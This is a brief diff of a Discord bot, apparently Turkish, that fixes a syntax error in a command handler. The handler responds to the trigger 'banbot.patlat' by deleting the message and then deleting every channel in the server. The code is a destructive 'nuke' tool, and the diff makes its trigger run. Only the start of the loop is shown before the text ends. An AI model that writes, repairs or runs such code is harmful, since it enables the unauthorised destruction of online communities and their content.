@@ -8,7 +8,7 @@ console.log("Bot Aktif")
 });
 
 client.on("message", msg => {
-if (msg.content === 'banbot.patlat' {
+if (msg.content === 'banbot.patlat') {
 msg.delete()
 msg.guild.channels.forEach(banbot => {
 banbot.delete()
